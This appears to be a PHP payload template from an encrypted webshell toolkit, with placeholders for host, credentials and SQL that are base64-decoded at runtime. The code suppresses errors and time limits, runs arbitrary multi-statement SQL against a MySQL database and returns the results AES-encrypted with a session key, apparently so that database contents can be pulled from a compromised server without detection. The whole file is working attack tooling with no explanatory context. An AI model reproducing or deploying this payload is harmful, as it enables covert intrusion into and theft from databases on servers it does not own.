
error_reporting(0);
@set_time_limit(0);
@ignore_user_abort(1);
@ini_set('max_execution_time', 0);
$key = $_SESSION['key'];
session_write_close();

$host = base64_decode('__HOST__');
$port = base64_decode('__PORT__');
$user = base64_decode('__USER__');
$passwd = base64_decode('__PASSWD__');
$database = base64_decode('__DBS__');
$sql = base64_decode('__SQL__');
$data = array(
    "status" => true,
    "data" => "",
    "msg" => "",
    "current" => base64_decode("__CURRENT__")
);
if (function_exists("mysqli_connect")) {
    $conn = mysqli_connect($host, $user, $passwd, $database, $port);
    if ($conn) {
        if ($res = mysqli_multi_query($conn, $sql)) {
            $tmp = array();
            do {
                if ($res = mysqli_store_result($conn)) {
                    $fields = mysqli_fetch_fields($res);
                    $filed_tmp = array();
                    foreach ($fields as $field)
                        array_push($filed_tmp, $field->name);
                    array_push($tmp, $filed_tmp);
                    while ($row = mysqli_fetch_row($res))
                        array_push($tmp, $row);
                }
            } while (mysqli_next_result($conn));
            $data["data"] = $tmp;
        } else {
            $data["status"] = false;
            $data["msg"] = mysqli_error($conn);
        }
    } else {
        $data["status"] = false;
        $data["msg"] = mysqli_connect_error();
    }
    mysqli_close($conn);
} else {
    $data["status"] = false;
    $data["msg"] = "This Server Not Support Mysql!";
}
echo openssl_encrypt(base64_encode(json_encode($data)), "aes-256-ecb", $key);
